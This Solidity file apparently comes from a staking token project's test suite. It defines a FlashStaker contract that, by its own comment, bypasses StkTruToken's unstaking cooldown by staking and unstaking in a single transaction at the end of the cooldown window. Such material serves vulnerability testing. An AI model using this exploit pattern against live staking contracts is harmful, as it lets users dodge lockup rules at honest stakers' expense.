// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {StkTruToken} from "./StkTruToken.sol";

/**
 * Flash staking and unstaking bypassing the cooldown mechanism by exploiting the very end of unstaking period.
 */
contract FlashStaker {
    StkTruToken private _stkTRU;
    IERC20 private _tru;

    constructor(StkTruToken stkTRU, IERC20 tru) {
        _stkTRU = stkTRU;
        _tru = tru;
    }

    function cooldown() public {
        _stkTRU.cooldown();
    }

    function stake(uint256 amount) public {
        _tru.approve(address(_stkTRU), amount);
        _stkTRU.stake(amount);
    }

    function stakeUnstake(uint256 stakeAmount, uint256 unstakeAmount) public {
        _tru.approve(address(_stkTRU), stakeAmount);
        _stkTRU.stake(stakeAmount);
        _stkTRU.unstake(unstakeAmount);
    }
}
